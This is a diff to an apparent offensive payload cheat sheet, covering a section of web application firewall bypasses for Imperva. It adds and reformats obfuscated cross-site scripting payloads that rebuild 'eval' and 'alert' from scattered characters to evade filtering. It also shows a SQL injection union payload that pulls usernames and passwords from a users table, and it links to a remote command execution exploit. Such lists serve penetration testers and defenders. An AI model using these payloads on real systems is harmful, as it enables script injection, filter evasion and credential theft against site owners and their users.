@@ -3609,12 +3609,16 @@ amUserId=1 union select username,password,3,4 from users
 ```
 
 ### Imperva
-- [XSS Bypass](https://twitter.com/0xInfection/status/1212331839743873026) by [@0xInfection](https://twitter.com/0xinfection)
+- [XSS Bypass](https://twitter.com/0xInfection/status/1364622858090016777) by [@0xInfection](https://twitter.com/0xInfection)
+```html
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
 ```
+- [XSS Bypass](https://twitter.com/0xInfection/status/1212331839743873026) by [@0xInfection](https://twitter.com/0xinfection)
+```html
 <a69/onclick=write&lpar;&rpar;>pew
 ```
 - [XSS Bypass](https://twitter.com/_ugurercan/status/1188406765735632896) by [@ugurercan](https://twitter.com/_ugurercan)
-```
+```html
 <details/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"/open>
 ```
 - [Imperva SecureSphere 13 - Remote Command Execution](https://www.exploit-db.com/exploits/45542) by [@rsp3ar](https://www.exploit-db.com/?author=9396)
